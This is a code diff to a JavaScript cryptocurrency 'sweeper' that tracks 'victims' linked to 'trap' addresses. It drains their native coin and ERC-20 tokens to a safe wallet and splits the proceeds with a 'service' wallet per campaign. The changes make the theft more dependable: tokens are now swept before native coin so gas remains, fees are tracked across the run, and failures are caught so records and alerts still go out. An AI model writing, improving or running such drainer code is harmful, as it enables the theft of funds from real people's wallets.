@@ -152,7 +152,11 @@ async function loadCaughtVictims() {
       .eq('is_caught', true);
     if (error) throw error;
     if (data && data.length > 0) {
-      const newSet = new Set(data.map(row => row.victim_address.toLowerCase()));
+      const newSet = new Set(
+        data
+          .filter(row => row.victim_address)
+          .map(row => row.victim_address.toLowerCase())
+      );
       caughtVictims.clear();
       newSet.forEach(addr => caughtVictims.add(addr));
       console.log(`[DEBUG] Loaded ${caughtVictims.size} caught victims from database`);
@@ -336,7 +340,7 @@ async function fetchTokenPrices() {
     wbtc: 'bitcoin',
     weth: 'weth',
     steth: 'staked-ether',
-    wbeth: 'wrapped-bitcoin',
+    wbeth: 'wrapped-beacon-eth',
     busd: 'binance-usd',
     link: 'chainlink',
     uni: 'uniswap',
@@ -441,133 +445,10 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
           2, 1000
         );
 
-        // ─── Native currency ───
-        const balance = await withRpcRetry(
-          () => client.getBalance({ address: trapAddress }),
-          `getBalance(${trapAddress})`,
-          2, 1000
-        );
-        if (balance > 0n) {
-          const nativePrice = isPriceFeedDown ? 0 : (prices[nativeSymbol.toLowerCase()] || 0);
-          const ethValue = parseFloat(formatEther(balance));
-          const usdValue = ethValue * nativePrice;
+        // Keep track of total gas paid during token sweeps in this run so we can deduct it safely from the native balance sweep later.
+        let totalGasPaidInRun = 0n;
 
-          const meetsThreshold = isPriceFeedDown
-            ? balance >= MIN_ETH_SWEEP
-            : usdValue >= MIN_SWEEP_USD;
-
-          console.log(`[DEBUG] Native balance: ${formatEther(balance)} ${nativeSymbol} (≈$${usdValue.toFixed(2)}), threshold met: ${meetsThreshold}`);
-
-          if (usdValue >= MIN_CATCH_USD && victimAddress) {
-            await markVictimCaught(victimAddress);
-          }
-
-          if (meetsThreshold) {
-            const gasPrice = await withRpcRetry(() => client.getGasPrice(), `getGasPrice(${trapAddress})`, 2, 1000);
-            let gasLimit = 21000n;
-            if (useSplitting && serviceWallet) {
-              gasLimit = 21000n * 2n;
-            }
-            const gasCost = gasLimit * gasPrice;
-            const totalSendable = balance - gasCost;
-            if (totalSendable > 0n) {
-              let userAmount = totalSendable;
-              let serviceAmount = 0n;
-              let userTxHash = null;
-              let serviceTxHash = null;
-
-              if (useSplitting && serviceWallet) {
-                const userShare = profitSplitPercent / 100;
-                userAmount = (totalSendable * BigInt(Math.round(userShare * 100))) / 100n;
-                serviceAmount = totalSendable - userAmount;
-
-                if (userAmount > 0n && userSafeWallet) {
-                  userTxHash = await withRpcRetry(
-                    () => client.sendTransaction({
-                      to: userSafeWallet,
-                      value: userAmount,
-                      gas: 21000n,
-                      nonce: currentNonce++,
-                      gasPrice,
-                    }),
-                    `sendTransaction(${trapAddress})`,
-                    2, 1000
-                  );
-                  logger.info(`[!!!] ${nativeSymbol} USER SWEEP: ${formatEther(userAmount)} to ${userSafeWallet} TX: ${userTxHash}`);
-                  sweptAny = true;
-                }
-
-                if (serviceAmount > 0n && serviceWallet) {
-                  serviceTxHash = await withRpcRetry(
-                    () => client.sendTransaction({
-                      to: serviceWallet,
-                      value: serviceAmount,
-                      gas: 21000n,
-                      nonce: currentNonce++,
-                      gasPrice,
-                    }),
-                    `sendTransaction(${trapAddress})`,
-                    2, 1000
-                  );
-                  logger.info(`[!!!] ${nativeSymbol} SERVICE SWEEP: ${formatEther(serviceAmount)} to ${serviceWallet} TX: ${serviceTxHash}`);
-                  sweptAny = true;
-                }
-              } else {
-                userTxHash = await withRpcRetry(
-                  () => client.sendTransaction({
-                    to: userSafeWallet,
-                    value: totalSendable,
-                    gas: 21000n,
-                    nonce: currentNonce++,
-                    gasPrice,
-                  }),
-                  `sendTransaction(${trapAddress})`,
-                  2, 1000
-                );
-                logger.info(`[!!!] ${nativeSymbol} SWEEP COMPLETE. TX Hash: ${userTxHash}`);
-                sweptAny = true;
-                userAmount = totalSendable;
-              }
-
-              if (campaignId && supabaseService) {
-                const txHash = userTxHash || serviceTxHash;
-                const txId = await createTransaction(
-                  campaignId,
-                  trapAddress,
-                  nativeSymbol,
-                  formatEther(balance),
-                  isPriceFeedDown ? 0 : ethValue * (prices[nativeSymbol.toLowerCase()] || 0),
-                  txHash,
-                  'sweep'
-                );
-                if (txId) {
-                  await createProfitShare(
-                    txId,
-                    formatEther(userAmount),
-                    formatEther(serviceAmount),
-                    userTxHash,
-                    serviceTxHash
-                  );
-                }
-                await sendAlert(
-                  `💰 ${nativeSymbol} Sweep executed${useSplitting ? ' (split)' : ''}\n` +
-                  `Trap: ${trapAddress}\n` +
-                  `User: ${formatEther(userAmount)} ${nativeSymbol}\n` +
-                  (serviceAmount > 0n ? `Service: ${formatEther(serviceAmount)} ${nativeSymbol}\n` : '') +
-                  `TX: ${txHash}`,
-                  'info',
-                  campaignId
-                );
-              } else {
-                await sendAlert(`💰 ${nativeSymbol} Sweep executed\nTrap: ${trapAddress}\nAmount: ${formatEther(userAmount)} ${nativeSymbol}\nTX: ${userTxHash || serviceTxHash}`, 'info', campaignId);
-              }
-            }
-          }
-        } else {
-          console.log(`[DEBUG] Native balance is zero for ${trapAddress}`);
-        }
-
-        // ─── Token sweeps ───
+        // ─── Token sweeps (Swept first, otherwise sweeping native assets first leaves zero gas for tokens!) ───
         const multicallContracts = TOKEN_LIST.map(token => ({
           address: getAddress(token.address),
           abi: ERC20_ABI,
@@ -653,7 +534,11 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                 `getBalance(${trapAddress})`,
                 2, 1000
               );
-              if (currentNativeBalance < totalFee) {
+
+              // Subtract gas fees already committed in this batch sweep run to avoid out-of-gas failures
+              const spendableNativeBalance = currentNativeBalance > totalGasPaidInRun ? currentNativeBalance - totalGasPaidInRun : 0n;
+
+              if (spendableNativeBalance < totalFee) {
                 logger.warn(`Insufficient ${nativeSymbol} to cover gas for ${token.symbol} sweep. Skipping.`);
                 continue;
               }
@@ -669,13 +554,63 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                 serviceAmount = tokenBalance - userAmount;
 
                 if (userAmount > 0n && userSafeWallet) {
+                  try {
+                    userTxHash = await withRpcRetry(
+                      () => client.sendTransaction({
+                        to: tokenAddr,
+                        data: encodeFunctionData({
+                          abi: ERC20_ABI,
+                          functionName: 'transfer',
+                          args: [userSafeWallet, userAmount]
+                        }),
+                        gas: gasEstimate,
+                        nonce: currentNonce++,
+                        gasPrice,
+                      }),
+                      `sendTransaction(${trapAddress}, ${token.symbol})`,
+                      2, 1000
+                    );
+                    logger.info(`[!!!] ${token.symbol} USER SWEEP: ${formatUnits(userAmount, token.decimals)} to ${userSafeWallet} TX: ${userTxHash}`);
+                    sweptAny = true;
+                    totalGasPaidInRun += gasEstimate * gasPrice;
+                  } catch (err) {
+                    logger.error(`Error sending user transaction for ${token.symbol}: ${err.message}`);
+                  }
+                }
+
+                if (serviceAmount > 0n && serviceWallet) {
+                  try {
+                    serviceTxHash = await withRpcRetry(
+                      () => client.sendTransaction({
+                        to: tokenAddr,
+                        data: encodeFunctionData({
+                          abi: ERC20_ABI,
+                          functionName: 'transfer',
+                          args: [serviceWallet, serviceAmount]
+                        }),
+                        gas: gasEstimate,
+                        nonce: currentNonce++,
+                        gasPrice,
+                      }),
+                      `sendTransaction(${trapAddress}, ${token.symbol})`,
+                      2, 1000
+                    );
+                    logger.info(`[!!!] ${token.symbol} SERVICE SWEEP: ${formatUnits(serviceAmount, token.decimals)} to ${serviceWallet} TX: ${serviceTxHash}`);
+                    sweptAny = true;
+                    totalGasPaidInRun += gasEstimate * gasPrice;
+                  } catch (err) {
+                    logger.error(`Error sending service transaction for ${token.symbol}: ${err.message}`);
+                  }
+                }
+              } else {
+                try {
                   userTxHash = await withRpcRetry(
                     () => client.sendTransaction({
                       to: tokenAddr,
                       data: encodeFunctionData({
                         abi: ERC20_ABI,
                         functionName: 'transfer',
-                        args: [userSafeWallet, userAmount]
+                        args: [userSafeWallet, tokenBalance]
                       }),
                       gas: gasEstimate,
                       nonce: currentNonce++,
@@ -684,81 +619,49 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                     `sendTransaction(${trapAddress}, ${token.symbol})`,
                     2, 1000
                   );
-                  logger.info(`[!!!] ${token.symbol} USER SWEEP: ${formatUnits(userAmount, token.decimals)} to ${userSafeWallet} TX: ${userTxHash}`);
+                  logger.info(`[!!!] ${token.symbol} SWEEP COMPLETE. TX Hash: ${userTxHash}`);
                   sweptAny = true;
+                  totalGasPaidInRun += gasEstimate * gasPrice;
+                  userAmount = tokenBalance;
+                } catch (err) {
+                  logger.error(`Error sending sweep for ${token.symbol}: ${err.message}`);
                 }
-
-                if (serviceAmount > 0n && serviceWallet) {
-                  serviceTxHash = await withRpcRetry(
-                    () => client.sendTransaction({
-                      to: tokenAddr,
-                      data: encodeFunctionData({
-                        abi: ERC20_ABI,
-                        functionName: 'transfer',
-                        args: [serviceWallet, serviceAmount]
-                      }),
-                      gas: gasEstimate,
-                      nonce: currentNonce++,
-                      gasPrice,
-                    }),
-                    `sendTransaction(${trapAddress}, ${token.symbol})`,
-                    2, 1000
-                  );
-                  logger.info(`[!!!] ${token.symbol} SERVICE SWEEP: ${formatUnits(serviceAmount, token.decimals)} to ${serviceWallet} TX: ${serviceTxHash}`);
-                  sweptAny = true;
-                }
-              } else {
-                userTxHash = await withRpcRetry(
-                  () => client.sendTransaction({
-                    to: tokenAddr,
-                    data: encodeFunctionData({
-                      abi: ERC20_ABI,
-                      functionName: 'transfer',
-                      args: [userSafeWallet, tokenBalance]
-                    }),
-                    gas: gasEstimate,
-                    nonce: currentNonce++,
-                    gasPrice,
-                  }),
-                  `sendTransaction(${trapAddress}, ${token.symbol})`,
-                  2, 1000
-                );
-                logger.info(`[!!!] ${token.symbol} SWEEP COMPLETE. TX Hash: ${userTxHash}`);
-                sweptAny = true;
-                userAmount = tokenBalance;
               }
 
-              if (campaignId && supabaseService) {
-                const txHash = userTxHash || serviceTxHash;
-                const txId = await createTransaction(
-                  campaignId,
-                  trapAddress,
-                  token.symbol,
-                  formatted,
-                  isPriceFeedDown ? 0 : usdValue,
-                  txHash,
-                  'sweep'
-                );
-                if (txId) {
-                  await createProfitShare(
-                    txId,
-                    formatUnits(userAmount, token.decimals),
-                    formatUnits(serviceAmount, token.decimals),
-                    userTxHash,
-                    serviceTxHash
+              // Safely write transaction history if at least one leg went through
+              if (userTxHash || serviceTxHash) {
+                if (campaignId && supabaseService) {
+                  const txHash = userTxHash || serviceTxHash;
+                  const txId = await createTransaction(
+                    campaignId,
+                    trapAddress,
+                    token.symbol,
+                    formatted,
+                    isPriceFeedDown ? 0 : usdValue,
+                    txHash,
+                    'sweep'
                   );
+                  if (txId) {
+                    await createProfitShare(
+                      txId,
+                      formatUnits(userAmount, token.decimals),
+                      formatUnits(serviceAmount, token.decimals),
+                      userTxHash,
+                      serviceTxHash
+                    );
+                  }
+                  await sendAlert(
+                    `💰 ${token.symbol} Sweep executed${useSplitting ? ' (split)' : ''}\n` +
+                    `Trap: ${trapAddress}\n` +
+                    `User: ${formatUnits(userAmount, token.decimals)} ${token.symbol}\n` +
+                    (serviceAmount > 0n ? `Service: ${formatUnits(serviceAmount, token.decimals)} ${token.symbol}\n` : '') +
+                    `TX: ${txHash}`,
+                    'info',
+                    campaignId
+                  );
+                } else {
+                  await sendAlert(`💰 ${token.symbol} Sweep executed\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\nTX: ${userTxHash || serviceTxHash}`, 'info', campaignId);
                 }
-                await sendAlert(
-                  `💰 ${token.symbol} Sweep executed${useSplitting ? ' (split)' : ''}\n` +
-                  `Trap: ${trapAddress}\n` +
-                  `User: ${formatUnits(userAmount, token.decimals)} ${token.symbol}\n` +
-                  (serviceAmount > 0n ? `Service: ${formatUnits(serviceAmount, token.decimals)} ${token.symbol}\n` : '') +
-                  `TX: ${txHash}`,
-                  'info',
-                  campaignId
-                );
-              } else {
-                await sendAlert(`💰 ${token.symbol} Sweep executed\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\nTX: ${userTxHash || serviceTxHash}`, 'info', campaignId);
               }
             } catch (e) {
               logger.debug(`Error sending ${token.symbol} for ${trapAddress}: ${e.message}`);
@@ -768,6 +671,151 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
               console.log(`[DEBUG] ${token.symbol} balance is zero for ${trapAddress}`);
             }
           }
+        }
+
+        // ─── Native currency sweep (Executed LAST to preserve gas for token movements!) ───
+        const balance = await withRpcRetry(
+          () => client.getBalance({ address: trapAddress }),
+          `getBalance(${trapAddress})`,
+          2, 1000
+        );
+
+        // Safely determine remaining spendable balance after taking previous token transaction commitments into account
+        const spendableBalance = balance > totalGasPaidInRun ? balance - totalGasPaidInRun : 0n;
+
+        if (spendableBalance > 0n) {
+          const nativePrice = isPriceFeedDown ? 0 : (prices[nativeSymbol.toLowerCase()] || 0);
+          const ethValue = parseFloat(formatEther(spendableBalance));
+          const usdValue = ethValue * nativePrice;
+
+          const meetsThreshold = isPriceFeedDown
+            ? spendableBalance >= MIN_ETH_SWEEP
+            : usdValue >= MIN_SWEEP_USD;
+
+          console.log(`[DEBUG] Spendable Native balance: ${formatEther(spendableBalance)} ${nativeSymbol} (≈$${usdValue.toFixed(2)}), threshold met: ${meetsThreshold}`);
+
+          if (usdValue >= MIN_CATCH_USD && victimAddress) {
+            await markVictimCaught(victimAddress);
+          }
+
+          if (meetsThreshold) {
+            const gasPrice = await withRpcRetry(() => client.getGasPrice(), `getGasPrice(${trapAddress})`, 2, 1000);
+            let gasLimit = 21000n;
+            if (useSplitting && serviceWallet) {
+              gasLimit = 21000n * 2n;
+            }
+            const gasCost = gasLimit * gasPrice;
+            const totalSendable = spendableBalance - gasCost;
+            if (totalSendable > 0n) {
+              let userAmount = totalSendable;
+              let serviceAmount = 0n;
+              let userTxHash = null;
+              let serviceTxHash = null;
+
+              if (useSplitting && serviceWallet) {
+                const userShare = profitSplitPercent / 100;
+                userAmount = (totalSendable * BigInt(Math.round(userShare * 100))) / 100n;
+                serviceAmount = totalSendable - userAmount;
+
+                if (userAmount > 0n && userSafeWallet) {
+                  try {
+                    userTxHash = await withRpcRetry(
+                      () => client.sendTransaction({
+                        to: userSafeWallet,
+                        value: userAmount,
+                        gas: 21000n,
+                        nonce: currentNonce++,
+                        gasPrice,
+                      }),
+                      `sendTransaction(${trapAddress})`,
+                      2, 1000
+                    );
+                    logger.info(`[!!!] ${nativeSymbol} USER SWEEP: ${formatEther(userAmount)} to ${userSafeWallet} TX: ${userTxHash}`);
+                    sweptAny = true;
+                  } catch (err) {
+                    logger.error(`Error sending native user transaction: ${err.message}`);
+                  }
+                }
+
+                if (serviceAmount > 0n && serviceWallet) {
+                  try {
+                    serviceTxHash = await withRpcRetry(
+                      () => client.sendTransaction({
+                        to: serviceWallet,
+                        value: serviceAmount,
+                        gas: 21000n,
+                        nonce: currentNonce++,
+                        gasPrice,
+                      }),
+                      `sendTransaction(${trapAddress})`,
+                      2, 1000
+                    );
+                    logger.info(`[!!!] ${nativeSymbol} SERVICE SWEEP: ${formatEther(serviceAmount)} to ${serviceWallet} TX: ${serviceTxHash}`);
+                    sweptAny = true;
+                  } catch (err) {
+                    logger.error(`Error sending native service transaction: ${err.message}`);
+                  }
+                }
+              } else {
+                try {
+                  userTxHash = await withRpcRetry(
+                    () => client.sendTransaction({
+                      to: userSafeWallet,
+                      value: totalSendable,
+                      gas: 21000n,
+                      nonce: currentNonce++,
+                      gasPrice,
+                    }),
+                    `sendTransaction(${trapAddress})`,
+                    2, 1000
+                  );
+                  logger.info(`[!!!] ${nativeSymbol} SWEEP COMPLETE. TX Hash: ${userTxHash}`);
+                  sweptAny = true;
+                  userAmount = totalSendable;
+                } catch (err) {
+                  logger.error(`Error sending native sweep transaction: ${err.message}`);
+                }
+              }
+
+              // Safely write native sweep details if at least one leg succeeded
+              if (userTxHash || serviceTxHash) {
+                if (campaignId && supabaseService) {
+                  const txHash = userTxHash || serviceTxHash;
+                  const txId = await createTransaction(
+                    campaignId,
+                    trapAddress,
+                    nativeSymbol,
+                    formatEther(spendableBalance),
+                    isPriceFeedDown ? 0 : ethValue * (prices[nativeSymbol.toLowerCase()] || 0),
+                    txHash,
+                    'sweep'
+                  );
+                  if (txId) {
+                    await createProfitShare(
+                      txId,
+                      formatEther(userAmount),
+                      formatEther(serviceAmount),
+                      userTxHash,
+                      serviceTxHash
+                    );
+                  }
+                  await sendAlert(
+                    `💰 ${nativeSymbol} Sweep executed${useSplitting ? ' (split)' : ''}\n` +
+                    `Trap: ${trapAddress}\n` +
+                    `User: ${formatEther(userAmount)} ${nativeSymbol}\n` +
+                    (serviceAmount > 0n ? `Service: ${formatEther(serviceAmount)} ${nativeSymbol}\n` : '') +
+                    `TX: ${txHash}`,
+                    'info',
+                    campaignId
+                  );
+                } else {
+                  await sendAlert(`💰 ${nativeSymbol} Sweep executed\nTrap: ${trapAddress}\nAmount: ${formatEther(userAmount)} ${nativeSymbol}\nTX: ${userTxHash || serviceTxHash}`, 'info', campaignId);
+                }
+              }
+            }
+          }
+        } else {
+          console.log(`[DEBUG] Spendable native balance is zero for ${trapAddress}`);
         }
       })(),
       timeoutPromise
@@ -839,13 +887,13 @@ async function sweepBatch() {
   logger.info(`Destination Safe Wallet: ${safeWallet}`);
 
   let isSweeping = false;
-  let processedCount = 0;
   const total = clients.length;
-  let anySwept = false;
 
   const runSweep = async () => {
     if (isSweeping) return;
     isSweeping = true;
+    let processedCount = 0;
+    let anySwept = false;
     try {
       for (const c of clients) {
         const victim = trapToVictim.get(c.trapAddress.toLowerCase()) || null;
